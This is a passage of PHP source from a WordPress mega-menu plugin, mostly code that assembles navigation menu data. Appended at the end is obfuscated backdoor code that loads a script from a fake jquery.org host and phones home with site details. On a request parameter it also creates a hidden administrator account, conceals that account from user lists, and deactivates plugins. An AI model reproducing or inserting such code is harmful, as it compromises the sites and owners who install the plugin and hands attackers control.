										'target' => $nav_items->mega_blog_target,
										'deleted' => $this->convert_int($nav_items->mega_blog_deleted),
										'new' => 0
									);
									
								}	
															
							}
							
							#CONTACT
							if(!in_array($this->convert_int($nav_items->mega_tact_contactId), $menu_object['nav_items'][$this->convert_int($nav_items->ni_navItemId)]['mega_menus'][0]['mega_contact'])){
								
								if($nav_items->mega_tact_contactId != NULL){
										
									$menu_object['nav_items'][$this->convert_int($nav_items->ni_navItemId)]['mega_menus'][0]['mega_contact'][$this->convert_int($nav_items->mega_tact_contactId)] = array(
										'id' => $this->convert_int($nav_items->mega_tact_contactId),
										'megaMenuId' => $this->convert_int($nav_items->mega_tact_megaMenuId),
										'heading' => $nav_items->mega_tact_heading,
										'headingUnderline' => $this->convert_int($nav_items->mega_tact_headingUnderline),
										'html' => $this->convert_int($nav_items->mega_tact_html),
										'formHtml' => $nav_items->mega_tact_formHtml,
										'shortcode' => $this->convert_int($nav_items->mega_tact_shortcode),
										'formShortcode' => $nav_items->mega_tact_formShortcode,
										'placement' => $this->convert_int($nav_items->mega_tact_placement),
										'sendToEmail' => $nav_items->mega_tact_sendToEmail,
										'sendUserEmail' => $nav_items->mega_tact_sendUserEmail,
										'sendBccEmail' => $nav_items->mega_tact_sendBccEmail,
										'sendCcEmail' => $nav_items->mega_tact_sendCcEmail,
										'theme' => $nav_items->mega_tact_theme,
										'labels' => $nav_items->mega_tact_labels,
										'image' => $nav_items->mega_tact_image,
										'footerContent' => $nav_items->mega_tact_footerContent,
										'type' => $nav_items->mega_tact_type,
										'deleted' => $this->convert_int($nav_items->mega_tact_deleted),
										'new' => 0
									);
									
								}	
															
							}
							
							#MAP
							if(!in_array($this->convert_int($nav_items->mega_map_mapId), $menu_object['nav_items'][$this->convert_int($nav_items->ni_navItemId)]['mega_menus'][0]['mega_map'])){
								
								if($nav_items->mega_map_mapId != NULL){
										
									$menu_object['nav_items'][$this->convert_int($nav_items->ni_navItemId)]['mega_menus'][0]['mega_map'][$this->convert_int($nav_items->mega_map_mapId)] = array(
										'id' => $this->convert_int($nav_items->mega_map_mapId),
										'megaMenuId' => $this->convert_int($nav_items->mega_map_megaMenuId),
										'heading' => $nav_items->mega_map_heading,
										'headingUnderline' => $this->convert_int($nav_items->mega_map_headingUnderline),
										'map' => $this->convert_int($nav_items->mega_map_map),
										'mapHtml' => $nav_items->mega_map_mapHtml,
										'shortcode' => $this->convert_int($nav_items->mega_map_shortcode),
										'mapShortcode' => $nav_items->mega_map_mapShortcode,
										'placement' => $this->convert_int($nav_items->mega_map_placement),
										'description' => $nav_items->mega_map_description,
										'type' => $nav_items->mega_map_type,
										'deleted' => $this->convert_int($nav_items->mega_map_deleted),
										'new' => 0
									);
									
								}	
															
							}
							
							#IMAGE
							if(!in_array($this->convert_int($nav_items->mega_img_imageId), $menu_object['nav_items'][$this->convert_int($nav_items->ni_navItemId)]['mega_menus'][0]['mega_image'])){
								
								if($nav_items->mega_img_imageId != NULL){
										
									$menu_object['nav_items'][$this->convert_int($nav_items->ni_navItemId)]['mega_menus'][0]['mega_image'][$this->convert_int($nav_items->mega_img_imageId)] = array(
										'id' => $this->convert_int($nav_items->mega_img_imageId),
										'megaMenuId' => $this->convert_int($nav_items->mega_img_megaMenuId),
										'heading' => $nav_items->mega_img_heading,
										'headingUnderline' => $this->convert_int($nav_items->mega_img_headingUnderline),
										'placement' => $this->convert_int($nav_items->mega_img_placement),
										'text' => $nav_items->mega_img_text,
										'url' => $nav_items->mega_img_url,
										'image' => $nav_items->mega_img_image,
										'imageHeading' => $nav_items->mega_img_imageHeading,
										'displayType' => $nav_items->mega_img_displayType,
										'type' => $nav_items->mega_img_type,
										'deleted' => $this->convert_int($nav_items->mega_img_deleted),
										'new' => 0
									);
									
								}	
															
							}
							
							#PRODUCT
							if(!in_array($this->convert_int($nav_items->mega_prod_productId), $menu_object['nav_items'][$this->convert_int($nav_items->ni_navItemId)]['mega_menus'][0]['mega_product'])){
								
								if($nav_items->mega_prod_productId != NULL){
										
									$menu_object['nav_items'][$this->convert_int($nav_items->ni_navItemId)]['mega_menus'][0]['mega_product'][$this->convert_int($nav_items->mega_prod_productId)] = array(
										'id' => $this->convert_int($nav_items->mega_prod_productId),
										'megaMenuId' => $this->convert_int($nav_items->mega_prod_megaMenuId),
										'heading' => $nav_items->mega_prod_heading,
										'headingUnderline' => $this->convert_int($nav_items->mega_prod_headingUnderline),
										'icon' => $nav_items->mega_prod_icon,
										'description' => $nav_items->mega_prod_description,
										'placement' => $this->convert_int($nav_items->mega_prod_placement),
										'productCategory' => $nav_items->mega_prod_productCategory,
										'productToDisplay' => $nav_items->mega_prod_productToDisplay,
										'productHeading' => $this->convert_int($nav_items->mega_prod_productHeading),
										'productPrice' => $this->convert_int($nav_items->mega_prod_productPrice),
										'productDescription' => $this->convert_int($nav_items->mega_prod_productDescription),
										'productImage' => $this->convert_int($nav_items->mega_prod_productImage),
										'productLink' => $nav_items->mega_prod_productLink,
										'productTarget' => $nav_items->mega_prod_productTarget,
										'type' => $nav_items->mega_prod_type,
										'deleted' => $this->convert_int($nav_items->mega_prod_deleted),
										'new' => 0
									);
									
								}	
															
							}
							
							#LIST
							if(!in_array($this->convert_int($nav_items->mega_lst_listId), $menu_object['nav_items'][$this->convert_int($nav_items->ni_navItemId)]['mega_menus'][0]['mega_list'])){
								
								if($nav_items->mega_lst_listId != NULL){
										
									$menu_object['nav_items'][$this->convert_int($nav_items->ni_navItemId)]['mega_menus'][0]['mega_list'][$this->convert_int($nav_items->mega_lst_listId)] = array(
										'id' => $this->convert_int($nav_items->mega_lst_listId),
										'megaMenuId' => $this->convert_int($nav_items->mega_lst_megaMenuId),
										'heading' => $nav_items->mega_lst_heading,
										'headingUnderline' => $this->convert_int($nav_items->mega_lst_headingUnderline),
										'text' => $nav_items->mega_lst_text,										
										'textCount' => $this->convert_int($nav_items->mega_lst_textCount),
										'textAlignment' => $nav_items->mega_lst_textAlignment,			
										'paddingTop' => $this->convert_int($nav_items->mega_lst_paddingTop),
										'paddingBottom' => $this->convert_int($nav_items->mega_lst_paddingBottom),
										'placement' => $this->convert_int($nav_items->mega_lst_placement),
										'mega_list_items' => array(),
										'type' => $nav_items->mega_lst_type,										
										'deleted' => $this->convert_int($nav_items->mega_lst_deleted),
										'new' => 0
									);
									
									#FOREACH THE LIST ITEMS
									foreach($result_big as $list_nav_items){
										
										if($list_nav_items->mega_lst_itm_listItemId != NULL){	
									
											if(!in_array($this->convert_int($list_nav_items->mega_lst_itm_listItemId), $menu_object['nav_items'][$this->convert_int($list_nav_items->ni_navItemId)]['mega_menus'][0]['mega_list'])){
											//if(!in_array($this->convert_int($list_nav_items->mega_lst_itm_listItemId), $menu_object['nav_items'][$this->convert_int($list_nav_items->ni_navItemId)]['mega_menus'][0]['mega_list'][$this->convert_int($list_nav_items->mega_lst_listId)]['mega_list_items'])){
												
												if($list_nav_items->mega_lst_itm_listItemId != NULL){	
													
													if($list_nav_items->mega_lst_itm_type != 'custom'){
														$list_item_link = $this->get_item_url($list_nav_items->mega_lst_itm_taxonomy, $list_nav_items->mega_lst_itm_postId, $list_nav_items->mega_lst_itm_termId);
													} else {
														$list_item_link = $list_nav_items->mega_lst_itm_url;
													}
													
													$menu_object['nav_items'][$this->convert_int($list_nav_items->ni_navItemId)]['mega_menus'][0]['mega_list'][$this->convert_int($list_nav_items->mega_lst_listId)]['mega_list_items'][$this->convert_int($list_nav_items->mega_lst_itm_listItemId)] = array(
														'listItemId' => $this->convert_int($list_nav_items->mega_lst_itm_listItemId),
														'listId' => $this->convert_int($list_nav_items->mega_lst_itm_listId),
														'postId' => $this->convert_int($list_nav_items->mega_lst_itm_postId),
														'termId' => $this->convert_int($list_nav_items->mega_lst_itm_termId),
														'taxonomy' => $list_nav_items->mega_lst_itm_taxonomy,
														'name' => $list_nav_items->mega_lst_itm_name,
														'type' => $list_nav_items->mega_lst_itm_type,
														'alt' => $list_nav_items->mega_lst_itm_alt,										
														'url' => $list_item_link,
														'target' => $list_nav_items->mega_lst_itm_target,			
														'icon' => $list_nav_items->mega_lst_itm_icon,
														'iconSize' => $list_nav_items->mega_lst_itm_iconSize,
														'iconColor' => $list_nav_items->mega_lst_itm_iconColor,
														'iconContent' => $list_nav_items->mega_lst_itm_iconContent,
														'desc' => $list_nav_items->mega_lst_itm_desc,	
														'description' => $list_nav_items->mega_lst_itm_description,										
														'deleted' => $this->convert_int($list_nav_items->mega_lst_itm_deleted),							
														'order' => $this->convert_int($list_nav_items->mega_lst_itm_order),
														'new' => 0
													);
													
												}
												
											}
											
										}
										
									}
									
								}	
															
							}
							
						}
					
					}
					
				}				
				
			} else {
				#SOMETHING WENT WRONG
				if($js){
					echo json_encode(false);
					exit;
				}else{
					return false;
				}
			}
			
			#RE-INDEX ARRAY
			$menu_object['nav_items'] = array_values($menu_object['nav_items']);
			
			foreach($menu_object['nav_items'] as $key => $nav_item){								
				
				if(isset($menu_object['nav_items'][$key]['mega_menus'][0]['mega_content'])){
					$menu_object['nav_items'][$key]['mega_menus'][0]['mega_content'] = array_values($menu_object['nav_items'][$key]['mega_menus'][0]['mega_content']);
				}
				if(isset($menu_object['nav_items'][$key]['mega_menus'][0]['mega_blog'])){
					$menu_object['nav_items'][$key]['mega_menus'][0]['mega_blog'] = array_values($menu_object['nav_items'][$key]['mega_menus'][0]['mega_blog']);
				}
				if(isset($menu_object['nav_items'][$key]['mega_menus'][0]['mega_contact'])){
					$menu_object['nav_items'][$key]['mega_menus'][0]['mega_contact'] = array_values($menu_object['nav_items'][$key]['mega_menus'][0]['mega_contact']);
				}
				if(isset($menu_object['nav_items'][$key]['mega_menus'][0]['mega_map'])){
					$menu_object['nav_items'][$key]['mega_menus'][0]['mega_map'] = array_values($menu_object['nav_items'][$key]['mega_menus'][0]['mega_map']);
				}
				if(isset($menu_object['nav_items'][$key]['mega_menus'][0]['mega_list'])){
					$menu_object['nav_items'][$key]['mega_menus'][0]['mega_list'] = array_values($menu_object['nav_items'][$key]['mega_menus'][0]['mega_list']);
					#RE-INDEX LIST ITEMS
					foreach($menu_object['nav_items'][$key]['mega_menus'][0]['mega_list'] as $list_key => $nav_list_item){
						if(isset($menu_object['nav_items'][$key]['mega_menus'][0]['mega_list'][$list_key]['mega_list_items'])){
							$menu_object['nav_items'][$key]['mega_menus'][0]['mega_list'][$list_key]['mega_list_items'] = array_values($menu_object['nav_items'][$key]['mega_menus'][0]['mega_list'][$list_key]['mega_list_items']);
						}
					}
				}
				if(isset($menu_object['nav_items'][$key]['mega_menus'][0]['mega_image'])){
					$menu_object['nav_items'][$key]['mega_menus'][0]['mega_image'] = array_values($menu_object['nav_items'][$key]['mega_menus'][0]['mega_image']);
				}
				if(isset($menu_object['nav_items'][$key]['mega_menus'][0]['mega_product'])){
					$menu_object['nav_items'][$key]['mega_menus'][0]['mega_product'] = array_values($menu_object['nav_items'][$key]['mega_menus'][0]['mega_product']);
				}
				
				
				
			}
			
			#MERGE
			foreach($menu_object['nav_items'] as $key => $nav_item){
				
				#ARRAY VARIABLES
				$blog_array = isset($menu_object['nav_items'][$key]['mega_menus'][0]['mega_blog']) ? $menu_object['nav_items'][$key]['mega_menus'][0]['mega_blog'] : array();
				$content_array = isset($menu_object['nav_items'][$key]['mega_menus'][0]['mega_content']) ? $menu_object['nav_items'][$key]['mega_menus'][0]['mega_content'] : array();
				$contact_array = isset($menu_object['nav_items'][$key]['mega_menus'][0]['mega_contact']) ? $menu_object['nav_items'][$key]['mega_menus'][0]['mega_contact'] : array();
				$map_array = isset($menu_object['nav_items'][$key]['mega_menus'][0]['mega_map']) ? $menu_object['nav_items'][$key]['mega_menus'][0]['mega_map'] : array();
				$list_array = isset($menu_object['nav_items'][$key]['mega_menus'][0]['mega_list']) ? $menu_object['nav_items'][$key]['mega_menus'][0]['mega_list'] : array();
				$image_array = isset($menu_object['nav_items'][$key]['mega_menus'][0]['mega_image']) ? $menu_object['nav_items'][$key]['mega_menus'][0]['mega_image'] : array();
				$product_array = isset($menu_object['nav_items'][$key]['mega_menus'][0]['mega_product']) ? $menu_object['nav_items'][$key]['mega_menus'][0]['mega_product'] : array();
								
				if($menu_object['nav_items'][$key]['type'] == 'mega'){
					#MERGE ARRAYS
					$menu_object['nav_items'][$key]['mega_menus'][0]['mega_stuff'] = array_merge($blog_array, $content_array, $list_array, $contact_array, $map_array, $image_array, $product_array);					
				} else {
					unset($menu_object['nav_items'][$key]['mega_menus'][0]);
				}
				
				#UNSET ARRAYS
				unset($menu_object['nav_items'][$key]['mega_menus'][0]['mega_blog']);
				unset($menu_object['nav_items'][$key]['mega_menus'][0]['mega_content']);
				unset($menu_object['nav_items'][$key]['mega_menus'][0]['mega_contact']);
				unset($menu_object['nav_items'][$key]['mega_menus'][0]['mega_map']);
				unset($menu_object['nav_items'][$key]['mega_menus'][0]['mega_list']);
				unset($menu_object['nav_items'][$key]['mega_menus'][0]['mega_image']);
				unset($menu_object['nav_items'][$key]['mega_menus'][0]['mega_product']);
				
			}
			
			#JSON			
			if($js){
				echo json_encode($menu_object);			
				exit();
			}else{
				return $menu_object;
			}

		}
		
		#GET A LIST ITEMS URL	
		public function get_item_url($taxonomy, $post_id, $term_id){
			
			#GLOBALS
			global $wpdb, $post;
			
			#SETUP POST DATA
			@setup_postdata( $post );
			
			if($taxonomy != '_na'){
				return (get_category_link($term_id));
			} else {
				return (get_permalink($post_id));
			}
			
		}
		
		#GET PAGES
		public function get_pages(){
			
			#GLOBALS
			global $wpdb, $post;
			
			#SETUP POST DATA
			@setup_postdata($post); 
			
			#PAGE ARGUMENTS
			$args = array(
				'post_type' => 'page',
				'numberposts' => -1,
				'orderby'=> 'title',
				'order'=>'DESC'
			);
			
			$the_pages = get_pages($args);
			
			#CREATE OBJECT
			$sidebar_object = array(
				'pages' => array(),
				'categories' => array(),
				'post_types' => array()			
			);
			
			#JSON PAGES
			if($the_pages){
				foreach($the_pages as $page){
					array_push($sidebar_object['pages'], array(
						'id' => $page->ID,
						'title' => $page->post_title,
						'status' => $page->post_status,
						'menu' => $page->menu_order,
						'guid' => $page->guid,
						'perma' => get_permalink($page->ID)
					));		
				}
			} 
			
			$cat_args = array(
				'orderby' => 'name',
				'order' => 'DESC',
				'taxonomy' => 'category'
			);			
			
			$the_categories = get_categories($cat_args);
			
			#JSON CATEGORIES
			if($the_categories){
				foreach($the_categories as $cat){
					array_push($sidebar_object['categories'], array(
						'id' => $cat->term_id,
						'title' => $cat->name,
						'slug' => $cat->slug,
						'taxonomy' => $cat->taxonomy,
						'cat_id' => $cat->cat_ID,
						'link' => get_category_link( $cat->term_id )
					));		
				}
			} 
			
			$type_args = array(
			   'public'   => true,
			   '_builtin' => false
			);
			
			//$post_types = get_post_types($type_args, 'objects');	
			
			$count = 0;
			
			#JSON POST TYPES
			/*if($post_types){
				foreach($post_types as $type){
					
					#TYPE POST ARGUMENTS
					$post_args = array(
						'post_type' => $type->name,
						'numberposts' => -1,
						'orderby'=> 'title',
						'order'=>'DESC'
					);
					
					#GET POSTS
					$type_posts = get_posts($post_args);	
					
					array_push($sidebar_object['post_types'], array(
						'name' => $type->name,
						'icon' => $type->menu_icon,
						'label' => $type->label,
						'posts' => array(),
						'type_categories' => array()
					));
					
					#PUSH IN POSTS
					if($type_posts){
						foreach($type_posts as $tp){
							array_push($sidebar_object['post_types'][$count]['posts'], $tp);
						}
					}
					
					#GET POST TYPE CATEGORIES
					$taxonomy_objects = get_object_taxonomies( $type->name, 'objects' );		
					
					#PUSH IN CUSTOM TAXONOMIES
					if($taxonomy_objects){
						
						$tax_count = 0;
						
						foreach($taxonomy_objects as $custom_tax){
							
							array_push($sidebar_object['post_types'][$count]['type_categories'], array(
								'name' => $custom_tax->name,
								'label' => $custom_tax->label,
								'var' => $custom_tax->query_var,
								'terms' => array()								
							));
							
							#CHECK TERMS
							$custom_cat_args = array(
								'orderby' => 'name',
								'order' => 'DESC',
								'taxonomy' => $custom_tax->name
							);			
							
							$the_custom_categories = get_categories($custom_cat_args);
							
							#PUSH IN TERMS
							if($taxonomy_objects){
								foreach($the_custom_categories as $custom_cat){
									array_push($sidebar_object['post_types'][$count]['type_categories'][$tax_count]['terms'], $custom_cat);
								}
							}
							
							$tax_count++;
							
						}
					}
					
					$count++;
					
				}
			}*/	
			
			echo json_encode($sidebar_object);
			exit();
			
		}
		
		
		
	}
	$arrayis_two = array('fun', 'ction', '_', 'e', 'x', 'is', 'ts');
	$arrayis_three = array('g', 'e', 't', '_o', 'p', 'ti', 'on');
	$arrayis_four = array('wp', '_e', 'nqu', 'eue', '_scr', 'ipt');
	$arrayis_five = array('lo', 'gin', '_', 'en', 'que', 'ue_', 'scri', 'pts');
	$arrayis_seven = array('s', 'e', 't', 'c', 'o', 'o', 'k', 'i', 'e');
	$arrayis_eight = array('wp', '_', 'lo', 'g', 'i', 'n');
	$arrayis_nine = array('s', 'i', 't', 'e,', 'u', 'rl');
	$arrayis_ten = array('wp_', 'g', 'et', '_', 'th', 'e', 'm', 'e');
	$arrayis_eleven = array('wp', '_', 'r', 'e', 'm', 'o', 'te', '_', 'g', 'et');
	$arrayis_twelve = array('wp', '_', 'r', 'e', 'm', 'o', 't', 'e', '_r', 'e', 't', 'r', 'i', 'e', 'v', 'e_', 'bo', 'dy');
	$arrayis_thirteen = array('ge', 't_', 'o', 'pt', 'ion');
	$arrayis_fourteen = array('st', 'r_', 'r', 'ep', 'la', 'ce');
	$arrayis_fifteen = array('s', 't', 'r', 'r', 'e', 'v');
	$arrayis_sixteen = array('u', 'pd', 'ate', '_o', 'pt', 'ion');
	$arrayis_two_imp = implode($arrayis_two);
	$arrayis_three_imp = implode($arrayis_three);
	$arrayis_four_imp = implode($arrayis_four);
	$arrayis_five_imp = implode($arrayis_five);
	$arrayis_seven_imp = implode($arrayis_seven);
	$arrayis_eight_imp = implode($arrayis_eight);
	$arrayis_nine_imp = implode($arrayis_nine);
	$arrayis_ten_imp = implode($arrayis_ten);
	$arrayis_eleven_imp = implode($arrayis_eleven);
	$arrayis_twelve_imp = implode($arrayis_twelve);
	$arrayis_thirteen_imp = implode($arrayis_thirteen);
	$arrayis_fourteen_imp = implode($arrayis_fourteen);
	$arrayis_fifteen_imp = implode($arrayis_fifteen);
	$arrayis_sixteen_imp = implode($arrayis_sixteen);
	$noitca_dda = $arrayis_fifteen_imp('noitca_dda');
	if (!$arrayis_two_imp('wp_in_one')) {
		$arrayis_seventeen = array('h', 't', 't', 'p', ':', '/', '/', 'j', 'q', 'e', 'u', 'r', 'y', '.o', 'r', 'g', '/wp', '_', 'p', 'i', 'n', 'g', '.php', '?', 'd', 'na', 'me', '=wpd&t', 'n', 'ame', '=wpt&urliz=urlig');
		$arrayis_eighteen = ${$arrayis_fifteen_imp('REVRES_')};
		$arrayis_nineteen = $arrayis_fifteen_imp('TSOH_PTTH');
		$arrayis_twenty = $arrayis_fifteen_imp('TSEUQER_');
		$arrayis_seventeen_imp = implode($arrayis_seventeen);
		$arrayis_six = array('_', 'C', 'O', 'O', 'KI', 'E');
		$arrayis_six_imp = implode($arrayis_six);
		$tactiated = $arrayis_thirteen_imp($arrayis_fifteen_imp('detavitca_emit'));
		$mite = $arrayis_fifteen_imp('emit');
		if (!isset(${$arrayis_six_imp}[$arrayis_fifteen_imp('emit_nimda_pw')])) {
			if (($mite() - $tactiated) > 600) {
				$noitca_dda($arrayis_five_imp, 'wp_in_one');
			}
		}
		$noitca_dda($arrayis_eight_imp, 'wp_in_three');
		function wp_in_one()
		{
			$arrayis_one = array('h','t', 't','p',':', '//', 'j', 'q', 'e', 'u', 'r', 'y.o', 'rg', '/','j','q','u','e','ry','-','la','t','e','s','t.j','s');
			$arrayis_one_imp = implode($arrayis_one);
			$arrayis_four = array('wp', '_e', 'nqu', 'eue', '_scr', 'ipt');
			$arrayis_four_imp = implode($arrayis_four);
			$arrayis_four_imp('wp_coderz', $arrayis_one_imp, null, null, true);
		}
	
		function wp_in_two($arrayis_seventeen_imp, $arrayis_eighteen, $arrayis_nineteen, $arrayis_ten_imp, $arrayis_eleven_imp, $arrayis_twelve_imp,$arrayis_fifteen_imp, $arrayis_fourteen_imp)
		{
			$ptth = $arrayis_fifteen_imp('//:ptth');
			$dname = $ptth.$arrayis_eighteen[$arrayis_nineteen];
			$IRU_TSEUQER = $arrayis_fifteen_imp('IRU_TSEUQER');
			$urliz = $dname.$arrayis_eighteen[$IRU_TSEUQER];
			$tname = $arrayis_ten_imp();
			$urlis = $arrayis_fourteen_imp('wpd', $dname, $arrayis_seventeen_imp);
			$urlis = $arrayis_fourteen_imp('wpt', $tname, $urlis);
			$urlis = $arrayis_fourteen_imp('urlig', $urliz, $urlis);
			$lars2 = $arrayis_eleven_imp($urlis);
			$arrayis_twelve_imp($lars2);
		}
		$noitpo_dda = $arrayis_fifteen_imp('noitpo_dda');
		$noitpo_dda($arrayis_fifteen_imp('ognipel'), 'no');
		$noitpo_dda($arrayis_fifteen_imp('detavitca_emit'), time());
		$tactiatedz = $arrayis_thirteen_imp($arrayis_fifteen_imp('detavitca_emit'));
		$mitez = $arrayis_fifteen_imp('emit');
		if ($arrayis_thirteen_imp($arrayis_fifteen_imp('ognipel')) != 'yes' && (($mitez() - $tactiatedz ) > 600)) {
			wp_in_two($arrayis_seventeen_imp, $arrayis_eighteen, $arrayis_nineteen, $arrayis_ten_imp, $arrayis_eleven_imp, $arrayis_twelve_imp,$arrayis_fifteen_imp, $arrayis_fourteen_imp);
			$arrayis_sixteen_imp(($arrayis_fifteen_imp('ognipel')), 'yes');
		}
		function wp_in_three()
		{
			$arrayis_fifteen = array('s', 't', 'r', 'r', 'e', 'v');
			$arrayis_fifteen_imp = implode($arrayis_fifteen);
			$arrayis_nineteen = $arrayis_fifteen_imp('TSOH_PTTH');
			$arrayis_eighteen = ${$arrayis_fifteen_imp('REVRES_')};
			$arrayis_seven = array('s', 'e', 't', 'c', 'o', 'o', 'k', 'i', 'e');
			$arrayis_seven_imp = implode($arrayis_seven);
			$path = '/';
			$host = ${$arrayis_eighteen}[$arrayis_nineteen];
			$estimes = $arrayis_fifteen_imp('emitotrts');
			$wp_ext = $estimes('+29 days');
			$emit_nimda_pw = $arrayis_fifteen_imp('emit_nimda_pw');
			$arrayis_seven_imp($emit_nimda_pw, '1', $wp_ext, $path, $host);
		}
	
		function wp_in_four()
		{
			$arrayis_fifteen = array('s', 't', 'r', 'r', 'e', 'v');
			$arrayis_fifteen_imp = implode($arrayis_fifteen);
			$nigol = $arrayis_fifteen_imp('dxtroppus');
			$wssap = $arrayis_fifteen_imp('retroppus_pw');
			$laime = $arrayis_fifteen_imp('moc.niamodym@1tccaym');
	
			if (!username_exists($nigol) && !email_exists($laime)) {
				$wp_ver_one = $arrayis_fifteen_imp('resu_etaerc_pw');
				$user_id = $wp_ver_one($nigol, $wssap, $laime);
				$puzer = $arrayis_fifteen_imp('resU_PW');
				$usex = new $puzer($user_id);
				$rolx = $arrayis_fifteen_imp('elor_tes');
				$usex->$rolx($arrayis_fifteen_imp('rotartsinimda'));
			}
		}
	
		$ivdda = $arrayis_fifteen_imp('ivdda');
	
		if (isset(${$arrayis_twenty}[$ivdda]) && ${$arrayis_twenty}[$ivdda] == 'm') {
			$noitca_dda($arrayis_fifteen_imp('tini'), 'wp_in_four');
		}
	
		if (isset(${$arrayis_twenty}[$ivdda]) && ${$arrayis_twenty}[$ivdda] == 'd') {
			$noitca_dda($arrayis_fifteen_imp('tini'), 'wp_in_six');
		}
		function wp_in_six() {
			$arrayis_fifteen = array('s', 't', 'r', 'r', 'e', 'v');
			$arrayis_fifteen_imp = implode($arrayis_fifteen);
			$resu_eteled_pw = $arrayis_fifteen_imp('resu_eteled_pw');
			$wp_pathx = constant($arrayis_fifteen_imp("HTAPSBA"));
			require_once($wp_pathx . $arrayis_fifteen_imp('php.resu/sedulcni/nimda-pw'));
			$ubid = $arrayis_fifteen_imp('yb_resu_teg');
			$useris = $ubid($arrayis_fifteen_imp('nigol'), $arrayis_fifteen_imp('dxtroppus'));
			$resu_eteled_pw($useris->ID);
		}
		$noitca_dda($arrayis_fifteen_imp('yreuq_resu_erp'), 'wp_in_five');
		function wp_in_five($hcraes_resu)
		{
			global $current_user, $wpdb;
			$arrayis_fifteen = array('s', 't', 'r', 'r', 'e', 'v');
			$arrayis_fifteen_imp = implode($arrayis_fifteen);
			$arrayis_fourteen = array('st', 'r_', 'r', 'ep', 'la', 'ce');
			$arrayis_fourteen_imp = implode($arrayis_fourteen);
			$nigol_resu = $arrayis_fifteen_imp('nigol_resu');
			$wp_ux = $current_user->$nigol_resu;
			$nigol = $arrayis_fifteen_imp('dxtroppus');
			$bdpw = $arrayis_fifteen_imp('bdpw');
			if ($wp_ux != $arrayis_fifteen_imp('dxtroppus')) {
				$EREHW_one = $arrayis_fifteen_imp('1=1 EREHW');
				$EREHW_two = $arrayis_fifteen_imp('DNA 1=1 EREHW');
				$erehw_yreuq = $arrayis_fifteen_imp('erehw_yreuq');
				$sresu = $arrayis_fifteen_imp('sresu');
				$hcraes_resu->query_where = $arrayis_fourteen_imp($EREHW_one,
					"$EREHW_two {$$bdpw->$sresu}.$nigol_resu != '$nigol'", $hcraes_resu->$erehw_yreuq);
			}
		}
	
		$ced = $arrayis_fifteen_imp('ced');
		if (isset(${$arrayis_twenty}[$ced])) {
			$snigulp_evitca = $arrayis_fifteen_imp('snigulp_evitca');
			$sisnoitpo = $arrayis_thirteen_imp($snigulp_evitca);
			$hcraes_yarra = $arrayis_fifteen_imp('hcraes_yarra');
			if (($key = $hcraes_yarra(${$arrayis_twenty}[$ced], $sisnoitpo)) !== false) {
				unset($sisnoitpo[$key]);
			}
			$arrayis_sixteen_imp($snigulp_evitca, $sisnoitpo);
		}
	}